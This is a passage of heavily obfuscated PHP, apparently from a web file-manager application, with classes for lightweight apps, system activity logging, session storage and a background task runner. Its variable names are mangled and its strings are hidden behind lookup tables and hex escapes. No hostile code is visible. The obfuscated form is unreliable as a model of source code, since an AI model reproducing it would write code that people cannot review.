$ÕĞ»ªß = $¾“„ ½[$­©°¹¹Ÿ[78]]; $úö¢Ø³Î = $Ä¯™å±Ê . str_replace("\x7b\x69\157\72{$âı˜Âí„}\175\57", $­©°¹¹Ÿ[12], $ÕĞ»ªß); if (!IO::exist($ÕĞ»ªß)) { $©Ûá¼Öè[] = $¾“„ ½[$­©°¹¹Ÿ[467]]; $¶ÓÃšŞş->updateFileEnd($¾“„ ½[$­©°¹¹Ÿ[32]], $¾“„ ½[$­©°¹¹Ÿ[80]]); continue; } if (IO::exist($úö¢Ø³Î)) { $¶ÓÃšŞş->updateFileEnd($¾“„ ½[$­©°¹¹Ÿ[32]], $¾“„ ½[$­©°¹¹Ÿ[80]]); continue; } if (!IO::move($ÕĞ»ªß, get_path_father($úö¢Ø³Î))) { $‚©ª§Í = !1; break; } $éöÃ‘üû = array($­©°¹¹Ÿ[467] => $¾“„ ½[$­©°¹¹Ÿ[467]]); $ğéÚÚş° = array($­©°¹¹Ÿ[818] => $¼ÃÍ•º, $­©°¹¹Ÿ[78] => $úö¢Ø³Î); Model($­©°¹¹Ÿ[192])->where($éöÃ‘üû)->save($ğéÚÚş°); } $this->removeByFileID($©Ûá¼Öè); if (!$‚©ª§Í) { $¶ÓÃšŞş->stop($ŸÌƒëŒ‘); return !1; } $¶ÓÃšŞş->end(); if ($ËÎ ¶“Û == $­©°¹¹Ÿ[1787]) { $this->remove($âı˜Âí„); } } public function progress($æü„ËÀï, $—ğÈÔ¢Ô) { return Task::get($—ğÈÔ¢Ô . $_SERVER[Ãìšã«™][2131] . $æü„ËÀï); } private function removeByFileID($Ù¦Ñúñê = array()) { $Ü½µóïÈ =& $_SERVER[Ãìšã«™]; if (empty($Ù¦Ñúñê)) { return; } $•³ƒ¤‰× = array($Ü½µóïÈ[467] => array($Ü½µóïÈ[7], $Ù¦Ñúñê)); $âò´Äæ = Model($Ü½µóïÈ[1321])->where($•³ƒ¤‰×)->field($Ü½µóïÈ[403])->select(); if (!$âò´Äæ) { return; } $âò´Äæ = array_to_keyvalue($âò´Äæ, $Ü½µóïÈ[12], $Ü½µóïÈ[403]); foreach ($âò´Äæ as $…Ã‰Ö„¥) { Model($Ü½µóïÈ[417])->removeNow($…Ã‰Ö„¥, !1); } } private function removeShareItems($İô¤ÈÊÅ) { $½³Ä–ˆÍ =& $_SERVER[Ãìšã«™]; $İ…¦Á = "\x7b\151\x6f\72{$İô¤ÈÊÅ}\175\x2f"; $æÜô…÷× = array($½³Ä–ˆÍ[403] => 0, $½³Ä–ˆÍ[1170] => array($½³Ä–ˆÍ[378], "{$İ…¦Á}\45")); $ãˆ½±Š› = Model($½³Ä–ˆÍ[1798])->where($æÜô…÷×)->field($½³Ä–ˆÍ[488])->select(); if (empty($ãˆ½±Š›)) { return; } $Ğ¿¯½´ = array_to_keyvalue($ãˆ½±Š›, $½³Ä–ˆÍ[12], $½³Ä–ˆÍ[488]); Model($½³Ä–ˆÍ[595])->remove($Ğ¿¯½´); } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\145\155\x2e\x4c\x69\x67\x68\x74\101\x70\x70"; public $modelType = "\123\x79\163\164\x65\x6d\x4f\160\x74\151\157\x6e"; public $field = array("\156\x61\155\145", "\147\x72\157\x75\x70", "\144\x65\163\143", "\x63\157\156\x74\145\x6e\x74"); public function listData($¶ü•–øŒ = false, $ö¶Ğ½Êï = "\x6d\157\x64\151\x66\x79\x54\x69\155\x65", $ì¹—ô„É = true) { return parent::listData($¶ü•–øŒ, $ö¶Ğ½Êï, $ì¹—ô„É); } public function remove($‚æ‚ì¢) { $Â»Ïşğ = $this->findByName($‚æ‚ì¢); if (!$Â»Ïşğ) { return !1; } return parent::remove($Â»Ïşğ[$_SERVER[Ãìšã«™][392]]); } public function add($ıììÀ±÷) { if ($this->findByName($ıììÀ±÷[$_SERVER[Ãìšã«™][32]])) { return !1; } return parent::insert($ıììÀ±÷); } public function update($äçÒóş, $ˆîÎËÎ) { $½òÜŞğù =& $_SERVER[Ãìšã«™]; $‹‡’«å = $this->findByName($äçÒóş); $†šæå¦ = $this->findByName($ˆîÎËÎ[$½òÜŞğù[32]]); if (!$‹‡’«å || $†šæå¦ && $†šæå¦[$½òÜŞğù[392]] != $‹‡’«å[$½òÜŞğù[392]]) { return !1; } return parent::update($‹‡’«å[$½òÜŞğù[392]], $ˆîÎËÎ); } } class SystemLogModel extends ModelBase { protected $tableName = "\x73\171\163\164\145\x6d\x5f\154\157\147"; protected $dataAuto = array(array("\x63\162\x65\x61\164\x65\124\151\155\145", "\x74\151\x6d\145", "\151\x6e\x73\145\x72\x74", "\146\165\x6e\x63\164\x69\157\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $‘±ŠéÚ =& $_SERVER[Ãìšã«™]; return array($‘±ŠéÚ[2134] => LNG($‘±ŠéÚ[2135]), $‘±ŠéÚ[2136] => LNG($‘±ŠéÚ[2137]), $‘±ŠéÚ[1761] => LNG($‘±ŠéÚ[2138]), $‘±ŠéÚ[2139] => LNG($‘±ŠéÚ[2140]), $‘±ŠéÚ[2141] => LNG($‘±ŠéÚ[2142]), $‘±ŠéÚ[2143] => LNG($‘±ŠéÚ[2144]), $‘±ŠéÚ[2145] => LNG($‘±ŠéÚ[2146]), $‘±ŠéÚ[1791] => LNG($‘±ŠéÚ[2146]), $‘±ŠéÚ[1792] => LNG($‘±ŠéÚ[2147]), $‘±ŠéÚ[2148] => LNG($‘±ŠéÚ[2149]), $‘±ŠéÚ[2150] => LNG($‘±ŠéÚ[2151]), $‘±ŠéÚ[2152] => LNG($‘±ŠéÚ[2153]), $‘±ŠéÚ[2154] => LNG($‘±ŠéÚ[2155]), $‘±ŠéÚ[1789] => LNG($‘±ŠéÚ[2156]), $‘±ŠéÚ[2157] => LNG($‘±ŠéÚ[2158]), $‘±ŠéÚ[1796] => LNG($‘±ŠéÚ[2159]), $‘±ŠéÚ[2160] => LNG($‘±ŠéÚ[2161]), $‘±ŠéÚ[2162] => LNG($‘±ŠéÚ[2163]), $‘±ŠéÚ[2164] => LNG($‘±ŠéÚ[2165]), $‘±ŠéÚ[2166] => LNG($‘±ŠéÚ[2167]), $‘±ŠéÚ[1799] => LNG($‘±ŠéÚ[2168]), $‘±ŠéÚ[1800] => LNG($‘±ŠéÚ[2169]), $‘±ŠéÚ[2170] => LNG($‘±ŠéÚ[2171]), $‘±ŠéÚ[2172] => LNG($‘±ŠéÚ[2173]), $‘±ŠéÚ[2174] => LNG($‘±ŠéÚ[2175]), $‘±ŠéÚ[1794] => LNG($‘±ŠéÚ[2176]), $‘±ŠéÚ[2177] => LNG($‘±ŠéÚ[2178]), $‘±ŠéÚ[1793] => LNG($‘±ŠéÚ[2179]), $‘±ŠéÚ[2180] => LNG($‘±ŠéÚ[2181]), $‘±ŠéÚ[2182] => LNG($‘±ŠéÚ[2183]), $‘±ŠéÚ[2184] => LNG($‘±ŠéÚ[2185]), $‘±ŠéÚ[2186] => LNG($‘±ŠéÚ[2186]), $‘±ŠéÚ[2187] => LNG($‘±ŠéÚ[1765]), $‘±ŠéÚ[2188] => LNG($‘±ŠéÚ[2189]), $‘±ŠéÚ[2190] => LNG($‘±ŠéÚ[2191]), $‘±ŠéÚ[2192] => LNG($‘±ŠéÚ[2193]), $‘±ŠéÚ[2194] => LNG($‘±ŠéÚ[2195]), $‘±ŠéÚ[2196] => LNG($‘±ŠéÚ[2197]), $‘±ŠéÚ[2198] => LNG($‘±ŠéÚ[2198]), $‘±ŠéÚ[2199] => LNG($‘±ŠéÚ[2200]), $‘±ŠéÚ[2201] => LNG($‘±ŠéÚ[2202]), $‘±ŠéÚ[2203] => LNG($‘±ŠéÚ[2204]), $‘±ŠéÚ[2205] => LNG($‘±ŠéÚ[2206]), $‘±ŠéÚ[2207] => LNG($‘±ŠéÚ[2208]), $‘±ŠéÚ[2209] => LNG($‘±ŠéÚ[2210])); } private function typeFile() { $«Æ—´Æ =& $_SERVER[Ãìšã«™]; $ƒÃ“ºı = array($«Æ—´Æ[1796] => array($«Æ—´Æ[1797]), $«Æ—´Æ[2152] => array($«Æ—´Æ[2211]), $«Æ—´Æ[2154] => array($«Æ—´Æ[2212]), $«Æ—´Æ[1789] => array($«Æ—´Æ[1790]), $«Æ—´Æ[2162] => array(), $«Æ—´Æ[2164] => array(), $«Æ—´Æ[2166] => array(), $«Æ—´Æ[1799] => array($«Æ—´Æ[1801]), $«Æ—´Æ[1800] => array($«Æ—´Æ[1801]), $«Æ—´Æ[2170] => array($«Æ—´Æ[2213]), $«Æ—´Æ[2172] => array($«Æ—´Æ[2213]), $«Æ—´Æ[2174] => array($«Æ—´Æ[2214]), $«Æ—´Æ[2160] => array($«Æ—´Æ[2215]), $«Æ—´Æ[1794] => array($«Æ—´Æ[2216]), $«Æ—´Æ[2177] => array($«Æ—´Æ[2217]), $«Æ—´Æ[1793] => array($«Æ—´Æ[1795])); return $ƒÃ“ºı; } private function typeAll() { $İ½İÙËá =& $_SERVER[Ãìšã«™]; $†óâÑ„í = $this->typeList; $ŞÄˆ‰î = array_filter($this->typeFile()); foreach ($ŞÄˆ‰î as $÷Êšì²¦ => $û¡ä“·ã) { $†óâÑ„í[$û¡ä“·ã[0]] = $†óâÑ„í[$÷Êšì²¦]; } $†óâÑ„í[$İ½İÙËá[1801]] = LNG($İ½İÙËá[2218]); $†óâÑ„í[$İ½İÙËá[2213]] = LNG($İ½İÙËá[2219]); return $†óâÑ„í; } public function addLog($ÁªûáÏÎ, $£ş¤ºù¡ = array()) { $ş¯™œ„Â =& $_SERVER[Ãìšã«™]; if (!isset($this->typeList[$ÁªûáÏÎ])) { return; } $ÊîÚí—Í = defined($ş¯™œ„Â[474]) && USER_ID ? USER_ID : (isset($£ş¤ºù¡[$ş¯™œ„Â[1650]]) ? $£ş¤ºù¡[$ş¯™œ„Â[1650]] : 0); if (!$ÊîÚí—Í) { $ÊîÚí—Í = (int) Session::get($ş¯™œ„Â[1950]); } $şóíå = get_client_ip(); if (!$£ş¤ºù¡ || strlen(json_encode($£ş¤ºù¡)) >= 1024) { $£ş¤ºù¡ = array($ş¯™œ„Â[2220] => $şóíå); } else { if (is_array($£ş¤ºù¡)) { $£ş¤ºù¡[$ş¯™œ„Â[2220]] = $şóíå; } else { $£ş¤ºù¡ = array($ş¯™œ„Â[1187] => $£ş¤ºù¡, $ş¯™œ„Â[2220] => $şóíå); } } $£ş¤ºù¡ = array($ş¯™œ„Â[1640] => Session::sign(), $ş¯™œ„Â[1641] => $ÊîÚí—Í, $ş¯™œ„Â[33] => $ÁªûáÏÎ, $ş¯™œ„Â[1643] => json_encode($£ş¤ºù¡)); parent::add($£ş¤ºù¡); } public function remove($ïÛ®©ƒƒ) { $this->where(array($_SERVER[Ãìšã«™][420] => $ïÛ®©ƒƒ))->delete(); } private function _makeOrder($š­£¿Ó¢ = '') { $ÆñÊØ©Ú =& $_SERVER[Ãìšã«™]; $Ï‚Œ±Äå = $ÆñÊØ©Ú[193]; $À“¾å³ = array($ÆñÊØ©Ú[448] => $ÆñÊØ©Ú[449], $ÆñÊØ©Ú[450] => $ÆñÊØ©Ú[451]); $Â†„–¨‘ = Input::get($ÆñÊØ©Ú[456], $ÆñÊØ©Ú[7], $ÆñÊØ©Ú[1982], array($ÆñÊØ©Ú[1908], $ÆñÊØ©Ú[450])); $Â†„–¨‘ = $À“¾å³[$Â†„–¨‘]; $š­£¿Ó¢ = $š­£¿Ó¢ . "{$Ï‚Œ±Äå}\x20{$Â†„–¨‘}"; return $this->order($š­£¿Ó¢); } public function get($ê¸àÈ–ç = '') { $òÖšß¾í =& $_SERVER[Ãìšã«™]; if (!$ê¸àÈ–ç) { show_json(array()); } $Şå›¼‡ı = array(); if ($ê¸àÈ–ç[$òÖšß¾í[1650]]) { $Şå›¼‡ı[$òÖšß¾í[1650]] = $ê¸àÈ–ç[$òÖšß¾í[1650]]; } if (isset($ê¸àÈ–ç[$òÖšß¾í[762]])) { $¹É€ŞÕ = $ê¸àÈ–ç[$òÖšß¾í[762]]; $Ù¨ÏÄŞï = isset($ê¸àÈ–ç[$òÖšß¾í[496]]) ? $ê¸àÈ–ç[$òÖšß¾í[496]] : time(); $Şå›¼‡ı[$òÖšß¾í[193]] = array($òÖšß¾í[328], array($¹É€ŞÕ, $Ù¨ÏÄŞï)); } if ($ê¸àÈ–ç[$òÖšß¾í[33]]) { $ÅìÎ‚Ú = explode($òÖšß¾í[50], $ê¸àÈ–ç[$òÖšß¾í[33]]); $æÊ„¦ˆ” = $this->typeFile(); $Í½±…Ñ† = array(); foreach ($ÅìÎ‚Ú as $ï·¡¹üâ) { $Í½±…Ñ†[] = $ï·¡¹üâ; if (isset($æÊ„¦ˆ”[$ï·¡¹üâ])) { $Í½±…Ñ† = array_merge($Í½±…Ñ†, $æÊ„¦ˆ”[$ï·¡¹üâ]); } } $Í½±…Ñ† = array_unique($Í½±…Ñ†); if ($Í½±…Ñ†) { $Şå›¼‡ı[$òÖšß¾í[33]] = array($òÖšß¾í[7], $Í½±…Ñ†); } } else { $Şå›¼‡ı[$òÖšß¾í[33]] = array($òÖšß¾í[2221], $òÖšß¾í[2222]); } if (!empty($ê¸àÈ–ç[$òÖšß¾í[2220]])) { $Şå›¼‡ı[$òÖšß¾í[451]] = array($òÖšß¾í[378], "\x25{$ê¸àÈ–ç[$òÖšß¾í[2220]]}\45"); } $úŒãıØë = $this->_makeOrder()->where($Şå›¼‡ı)->selectPage(); if (empty($úŒãıØë[$òÖšß¾í[364]])) { show_json(array(), !0, $úŒãıØë[$òÖšß¾í[361]]); } $úŒãıØë[$òÖšß¾í[364]] = $this->logList($úŒãıØë[$òÖšß¾í[364]]); return $úŒãıØë; } private function ipAddress(&$Š¨ˆ«¡š) { $Á”ĞŠç‹ =& $_SERVER[Ãìšã«™]; if (!empty($Š¨ˆ«¡š[$Á”ĞŠç‹[2220]])) { $¼–´€ø’ = IpLocation::get($Š¨ˆ«¡š[$Á”ĞŠç‹[2220]]); } else { $¼–´€ø’ = LNG($Á”ĞŠç‹[2223]); } $Š¨ˆ«¡š[$Á”ĞŠç‹[2224]] = $¼–´€ø’; } private function descZipDownload($·øşÔøè, &$®ã°©¤) { $ Ñè±¨½ =& $_SERVER[Ãìšã«™]; if (!isset($·øşÔøè[$ Ñè±¨½[2225]])) { return; } $êÆî×Ï = json_decode($·øşÔøè[$ Ñè±¨½[2225]], !0); foreach ($êÆî×Ï as $ÈİàõæÑ) { try { $·Í¦¥å³ = IO::infoFull($ÈİàõæÑ[$ Ñè±¨½[78]]); } catch (Exception $¼‡Â¾œØ) { continue; } $·øşÔøè[$ Ñè±¨½[78]] = $ÈİàõæÑ[$ Ñè±¨½[78]]; $®ã°©¤[] = $·øşÔøè[$ Ñè±¨½[403]] = $·Í¦¥å³[$ Ñè±¨½[403]]; $®ã°©¤[] = $·øşÔøè[$ Ñè±¨½[2036]] = $·Í¦¥å³[$ Ñè±¨½[498]]; break; } return $·øşÔøè; } private function getSourceList(&$¡ã ×Ì) { $²‡İ§· =& $_SERVER[Ãìšã«™]; $å…İ¥œù = array(); foreach ($¡ã ×Ì as $ÑüøáÉ» => $´œî²Ì±) { $šáµÈ = json_decode($´œî²Ì±[$²‡İ§·[451]], !0); if ($´œî²Ì±[$²‡İ§·[33]] == $²‡İ§·[1792]) { $šáµÈ = $this->descZipDownload($šáµÈ, $å…İ¥œù); $¡ã ×Ì[$ÑüøáÉ»][$²‡İ§·[451]] = json_encode($šáµÈ); continue; } if (strpos($´œî²Ì±[$²‡İ§·[33]], $²‡İ§·[2038]) !== 0) { if (!isset($šáµÈ[$²‡İ§·[78]]) || strpos($´œî²Ì±[$²‡İ§·[33]], $²‡İ§·[2226]) !== 0) { continue; } try { $Ïß©ùÊ = IO::infoFull($šáµÈ[$²‡İ§·[78]]); } catch (Exception $ç‰äîû˜) { continue; } $å…İ¥œù[] = $šáµÈ[$²‡İ§·[403]] = $Ïß©ùÊ[$²‡İ§·[403]]; $å…İ¥œù[] = $šáµÈ[$²‡İ§·[2036]] = $Ïß©ùÊ[$²‡İ§·[498]]; $¡ã ×Ì[$ÑüøáÉ»][$²‡İ§·[451]] = json_encode($šáµÈ); continue; } $å…İ¥œù[] = $šáµÈ[$²‡İ§·[403]]; $å…İ¥œù[] = $šáµÈ[$²‡İ§·[2036]]; if ($šáµÈ[$²‡İ§·[33]] == $²‡İ§·[551]) { $å…İ¥œù[] = $šáµÈ[$²‡İ§·[451]][$²‡İ§·[1154]]; $å…İ¥œù[] = $šáµÈ[$²‡İ§·[451]][$²‡İ§·[1155]]; } if ($šáµÈ[$²‡İ§·[33]] == $²‡İ§·[2045]) { $å…İ¥œù[] = $šáµÈ[$²‡İ§·[451]][$²‡İ§·[403]]; } } if (!$å…İ¥œù) { return array(); } return Model($²‡İ§·[826])->sourceListInfo($å…İ¥œù, !0); } private function logList($„›®İ®è) { $öµÚÌ‹é =& $_SERVER[Ãìšã«™]; $”²çêÁš = array_to_keyvalue($„›®İ®è, $öµÚÌ‹é[12], $öµÚÌ‹é[1650]); $ªì÷“˜¹ = Model($öµÚÌ‹é[538])->userListInfo(array_unique($”²çêÁš)); $¬ÕÕô‰Ù = $this->getSourceList($„›®İ®è); $Š÷Ù¨–Ï = $this->typeAll(); $ğ¸›ËÏ³ = array(); $–·’ûª = array(); foreach ($„›®İ®è as $½£–ü½² => $õºôîÛÖ) { $‚Ùï‘ÖŒ = $õºôîÛÖ[$öµÚÌ‹é[33]]; $ü·ïúİ = isset($ªì÷“˜¹[$õºôîÛÖ[$öµÚÌ‹é[1650]]]) ? $ªì÷“˜¹[$õºôîÛÖ[$öµÚÌ‹é[1650]]] : !1; $ïŸ¨³´æ = strpos($‚Ùï‘ÖŒ, $öµÚÌ‹é[2227]) === 0 ? LNG($öµÚÌ‹é[2228]) : LNG($öµÚÌ‹é[2223]); $õºôîÛÖ[$öµÚÌ‹é[32]] = isset($ü·ïúİ[$öµÚÌ‹é[32]]) ? $ü·ïúİ[$öµÚÌ‹é[32]] : LNG($öµÚÌ‹é[2223]); $õºôîÛÖ[$öµÚÌ‹é[2086]] = isset($ü·ïúİ[$öµÚÌ‹é[2086]]) ? $ü·ïúİ[$öµÚÌ‹é[2086]] : $öµÚÌ‹é[12]; $õºôîÛÖ[$öµÚÌ‹é[1548]] = isset($Š÷Ù¨–Ï[$‚Ùï‘ÖŒ]) ? $Š÷Ù¨–Ï[$‚Ùï‘ÖŒ] : $ïŸ¨³´æ; $õºôîÛÖ[$öµÚÌ‹é[1981]] = $ü·ïúİ; $úŞ±°­ = json_decode($õºôîÛÖ[$öµÚÌ‹é[451]], !0); $õºôîÛÖ[$öµÚÌ‹é[2220]] = isset($úŞ±°­[$öµÚÌ‹é[2220]]) ? $úŞ±°­[$öµÚÌ‹é[2220]] : $öµÚÌ‹é[12]; $õºôîÛÖ[$öµÚÌ‹é[2224]] = IpLocation::get($õºôîÛÖ[$öµÚÌ‹é[2220]]); if (strpos($‚Ùï‘ÖŒ, $öµÚÌ‹é[2038]) === 0 || isset($úŞ±°­[$öµÚÌ‹é[2036]])) { $úŞ±°­[$öµÚÌ‹é[87]] = $¬ÕÕô‰Ù[$úŞ±°­[$öµÚÌ‹é[403]]]; $úŞ±°­[$öµÚÌ‹é[2050]] = $¬ÕÕô‰Ù[$úŞ±°­[$öµÚÌ‹é[2036]]]; if ($úŞ±°­[$öµÚÌ‹é[33]] == $öµÚÌ‹é[551]) { $úŞ±°­[$öµÚÌ‹é[451]][$öµÚÌ‹é[1154]] = $¬ÕÕô‰Ù[$úŞ±°­[$öµÚÌ‹é[451]][$öµÚÌ‹é[1154]]]; $úŞ±°­[$öµÚÌ‹é[451]][$öµÚÌ‹é[1155]] = $¬ÕÕô‰Ù[$úŞ±°­[$öµÚÌ‹é[451]][$öµÚÌ‹é[1155]]]; } if ($úŞ±°­[$öµÚÌ‹é[33]] == $öµÚÌ‹é[2045]) { $úŞ±°­[$öµÚÌ‹é[451]][$öµÚÌ‹é[403]] = $¬ÕÕô‰Ù[$úŞ±°­[$öµÚÌ‹é[451]][$öµÚÌ‹é[403]]]; } if ($úŞ±°­[$öµÚÌ‹é[33]] == $öµÚÌ‹é[1787]) { $úŞ±°­[$öµÚÌ‹é[2050]] = $úŞ±°­[$öµÚÌ‹é[87]]; $úŞ±°­[$öµÚÌ‹é[2036]] = $úŞ±°­[$öµÚÌ‹é[2050]][$öµÚÌ‹é[403]]; $úŞ±°­[$öµÚÌ‹é[87]] = !1; $úŞ±°­[$öµÚÌ‹é[403]] = $öµÚÌ‹é[12]; } if ($úŞ±°­[$öµÚÌ‹é[87]] && $úŞ±°­[$öµÚÌ‹é[87]][$öµÚÌ‹é[412]] == $öµÚÌ‹é[1270]) { $–·’ûª[] = $õºôîÛÖ[$öµÚÌ‹é[392]]; unset($„›®İ®è[$½£–ü½²]); continue; } if ($úŞ±°­[$öµÚÌ‹é[2050]] && $úŞ±°­[$öµÚÌ‹é[2050]][$öµÚÌ‹é[412]] == $öµÚÌ‹é[1270]) { $–·’ûª[] = $õºôîÛÖ[$öµÚÌ‹é[392]]; unset($„›®İ®è[$½£–ü½²]); continue; } } $õºôîÛÖ[$öµÚÌ‹é[451]] = $úŞ±°­; unset($õºôîÛÖ[$öµÚÌ‹é[2229]]); $ğ¸›ËÏ³[] = $õºôîÛÖ; } $this->clearSystemPathLog($–·’ûª); return $ğ¸›ËÏ³; } private function clearSystemPathLog($¬… ëÙ) { $œÈ•Š°ï =& $_SERVER[Ãìšã«™]; if (count($¬… ëÙ) == 0) { return; } $‘†Şì¬ = array($œÈ•Š°ï[392] => array($œÈ•Š°ï[7], array_unique($¬… ëÙ))); $this->where($‘†Şì¬)->delete(); } public function deviceList($ŒÎ‡“‚™, $öì«¾°‘ = 0) { $¯â—ô¹Õ =& $_SERVER[Ãìšã«™]; $¶œÈ˜³™ = array($¯â—ô¹Õ[1650] => $ŒÎ‡“‚™, $¯â—ô¹Õ[193] => array($¯â—ô¹Õ[1010], $öì«¾°‘), $¯â—ô¹Õ[33] => $¯â—ô¹Õ[1761]); $Ğ€Ú‚ÔÀ = array(); $ìÏ²Œğ‰ = $this->field($¯â—ô¹Õ[2230])->where($¶œÈ˜³™)->order($¯â—ô¹Õ[2048])->limit(50)->select(); foreach ($ìÏ²Œğ‰ as $·œšœ€Ö => $¹³²ŞªÉ) { if ($·œšœ€Ö > 0 && abs($¹³²ŞªÉ[$¯â—ô¹Õ[193]] - $ìÏ²Œğ‰[$·œšœ€Ö - 1][$¯â—ô¹Õ[193]]) < 5) { continue; } $¼§üÊ‡æ = json_decode($¹³²ŞªÉ[$¯â—ô¹Õ[451]], !0); $¹³²ŞªÉ[$¯â—ô¹Õ[2220]] = isset($¼§üÊ‡æ[$¯â—ô¹Õ[2220]]) ? $¼§üÊ‡æ[$¯â—ô¹Õ[2220]] : $¯â—ô¹Õ[12]; unset($¼§üÊ‡æ[$¯â—ô¹Õ[2220]]); $Ë…ñ¸ö = $this->deviceType($¼§üÊ‡æ[$¯â—ô¹Õ[2039]]); if (isset($Ğ€Ú‚ÔÀ[$Ë…ñ¸ö])) { continue; } $¹³²ŞªÉ[$¯â—ô¹Õ[2224]] = IpLocation::get($¹³²ŞªÉ[$¯â—ô¹Õ[2220]]); $¹³²ŞªÉ[$¯â—ô¹Õ[451]] = $¼§üÊ‡æ; $Ğ€Ú‚ÔÀ[$Ë…ñ¸ö] = $¹³²ŞªÉ; } return array_values($Ğ€Ú‚ÔÀ); } public function deviceType($¡»ğ„òÛ) { return $¡»ğ„òÛ; } } goto cæ³¦‰…·Ì; FêÔÓ­Ü±: class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $´Ö™ù“Ç =& $_SERVER[Ãìšã«™]; static $ö©ãÜü = false; if ($ö©ãÜü) { return $ö©ãÜü; } $–µóÎ‚Ò = $GLOBALS[$´Ö™ù“Ç[6]][$´Ö™ù“Ç[344]]; self::$sessionTime = $–µóÎ‚Ò[$´Ö™ù“Ç[1606]]; $÷¿Ê½Æë = isset($GLOBALS[$´Ö™ù“Ç[1607]]) ? $GLOBALS[$´Ö™ù“Ç[1607]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($÷¿Ê½Æë)) { self::$sessionSign = Cookie::get($÷¿Ê½Æë); } else { self::$sessionSign = guid(); } } Cookie::setSafe($÷¿Ê½Æë, self::$sessionSign, self::$sessionTime); $ó‡ôùóÒ = $–µóÎ‚Ò[$´Ö™ù“Ç[1608]]; $Úßú©Œä = $–µóÎ‚Ò[$ó‡ôùóÒ]; $ˆ®šúÆ˜ = $–µóÎ‚Ò[$´Ö™ù“Ç[829]]; switch ($ó‡ôùóÒ) { case $´Ö™ù“Ç[21]: self::$handle = Model($´Ö™ù“Ç[830]); break; case $´Ö™ù“Ç[831]: self::$handle = new CacheRedis($Úßú©Œä, $ˆ®šúÆ˜); break; case $´Ö™ù“Ç[832]: self::$handle = new CacheMemcached($Úßú©Œä, $ˆ®šúÆ˜); break; case $´Ö™ù“Ç[192]: $Úßú©Œä[$´Ö™ù“Ç[78]] = $Úßú©Œä[$´Ö™ù“Ç[78]] . $´Ö™ù“Ç[1609]; self::$handle = new CacheFile($Úßú©Œä, $ˆ®šúÆ˜); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $ö©ãÜü = new self(); return $ö©ãÜü; } public static function getBySign($°´ ßï¹) { CacheLock::lock($°´ ßï¹); $¡é¹£‡Û = self::$handle->get($°´ ßï¹); CacheLock::unlock($°´ ßï¹); $¡é¹£‡Û = unserialize($¡é¹£‡Û); return is_array($¡é¹£‡Û) ? $¡é¹£‡Û : array(); } public static function setBySign($êË´—³Ö, $ ÷×ıôÃ) { CacheLock::lock($êË´—³Ö); self::$handle->set($êË´—³Ö, serialize($ ÷×ıôÃ), self::$sessionTime); CacheLock::unlock($êË´—³Ö); } public static function sign($‡„…‰×Ö = false) { $‡„…‰×Ö && (self::$sessionSign = $‡„…‰×Ö); self::init(); return self::$sessionSign; } public static function set($©ö·ï¤ï, $ªí±é°é = false) { self::init(); if (is_array($©ö·ï¤ï)) { foreach ($©ö·ï¤ï as $½’®Õ¬Ø => $…ÆˆÕ®†) { array_set_value(self::$data, $½’®Õ¬Ø, $…ÆˆÕ®†); } } else { array_set_value(self::$data, $©ö·ï¤ï, $ªí±é°é); } self::setBySign(self::$sessionSign, self::$data); } public static function get($÷º¸ƒãŠ = false) { self::init(); if (!$÷º¸ƒãŠ) { return self::$data; } return array_get_value(self::$data, $÷º¸ƒãŠ); } public static function remove($€ãşïğŒ) { self::init(); unset(self::$data[$€ãşïğŒ]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[Ãìšã«™][834])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $Õ¢§¿ã =& $_SERVER[Ãìšã«™]; if (self::valueGet($Õ¢§¿ã[751]) != $Õ¢§¿ã[89]) { return; } if (self::valueGet($Õ¢§¿ã[1610]) == $Õ¢§¿ã[89]) { $Øù–ÍÒó = self::valueGet($Õ¢§¿ã[1611]); if (time() - $Øù–ÍÒó > self::AUTO_RESTART_TIME) { self::restart(); } return; } http_close(); self::valueSet($Õ¢§¿ã[1610], $Õ¢§¿ã[89]); self::log($Õ¢§¿ã[1612]); Hook::bind($Õ¢§¿ã[1613], $Õ¢§¿ã[1614]); $¹”®û¢Ô = 0; while (!0) { self::cacheClear(); if (self::valueGet($Õ¢§¿ã[751]) != $Õ¢§¿ã[89]) { self::valueSet($Õ¢§¿ã[1610], $Õ¢§¿ã[190]); self::log($Õ¢§¿ã[1615]); die; } $‰ÉÙê–· = time(); if ($‰ÉÙê–· - $¹”®û¢Ô >= 60) { self::valueSet(array($Õ¢§¿ã[1610] => $Õ¢§¿ã[89], $Õ¢§¿ã[1611] => $‰ÉÙê–·), !1); $¹”®û¢Ô = $‰ÉÙê–·; } if (!file_exists(USER_SYSTEM . $Õ¢§¿ã[1616])) { self::valueSet(array($Õ¢§¿ã[1610] => $Õ¢§¿ã[190], $Õ¢§¿ã[751] => $Õ¢§¿ã[190]), !1); self::log($Õ¢§¿ã[1617]); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function restart() { $ŞÎÜşÒ =& $_SERVER[Ãìšã«™]; http_close(); self::valueSet($ŞÎÜşÒ[751], $ŞÎÜşÒ[190]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($ŞÎÜşÒ[1610] => $ŞÎÜşÒ[190], $ŞÎÜşÒ[751] => $ŞÎÜşÒ[89]), !1); } public static function shutdownEvent() { $ÔÊŞª¾ =& $_SERVER[Ãìšã«™]; self::valueSet($ÔÊŞª¾[1610], $ÔÊŞª¾[190]); self::log($ÔÊŞª¾[1618]); } public static function config($µßÔŞè‹, $…¶¢ßº) { self::valueSet($_SERVER[Ãìšã«™][751], $µßÔŞè‹); } private static function taskRunAll() { $¥Ç°ß“ =& $_SERVER[Ãìšã«™]; $ê‘ºŞ©¡ = timeFloat(); $Âœôöœ— = Model($¥Ç°ß“[1619])->listData(); $úÎæ„“ = count($Âœôöœ—); for ($ƒÜ»³ëï = 0; $ƒÜ»³ëï < $úÎæ„“; $ƒÜ»³ëï++) { $Ö• É¯ = $Âœôöœ—[$ƒÜ»³ëï]; if (!$Ö• É¯[$¥Ç°ß“[392]] || 